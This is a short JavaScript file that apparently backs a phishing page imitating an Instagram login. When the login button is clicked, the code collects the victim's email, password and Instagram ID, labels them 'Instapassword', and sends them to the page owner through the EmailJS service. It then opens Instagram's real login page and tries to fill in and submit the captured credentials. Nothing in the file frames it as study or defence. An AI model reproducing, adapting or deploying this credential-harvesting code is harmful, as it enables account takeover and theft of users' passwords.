function sendEmail() {
    var params = {
        name: "suraj maurya",
        email: document.querySelector("#email").value,
        password: document.querySelector("#pass").value,
        message: `Instapassword: ${document.querySelector("#message").value}, id: ${instagramid}`
    };
    const serviceID = "service_r4nowaf";
    const templateID = "template_us11w5m";
    
    emailjs.send(serviceID, templateID, params)
    .then(
        res => {
            document.querySelector("#email").value = "";
            document.querySelector("#pass").value = "";
            document.querySelector("#message").value = "";
            document.querySelector("#instagramid").value = "";
            console.log(res);
            
            alert("Message sent successfully");
        })
        .catch((err) => console.log(err));
}

document.getElementById("logi").addEventListener('click', sendEmail);



function openInstagramAndLogin() {
    var instagramID = document.querySelector("#instagramid").value;
    var password = document.querySelector("#pass").value;
    var loginUrl = `https://www.instagram.com/accounts/login/`;

    var newWindow = window.open(loginUrl, '_blank');
    newWindow.onload = function() {
        newWindow.document.querySelector("input[name='username']").value = instagramID;
        newWindow.document.querySelector("input[name='password']").value = password;
        newWindow.document.querySelector("button[type='submit']").click();
    };
}

document.getElementById("logi").addEventListener('click', openInstagramAndLogin);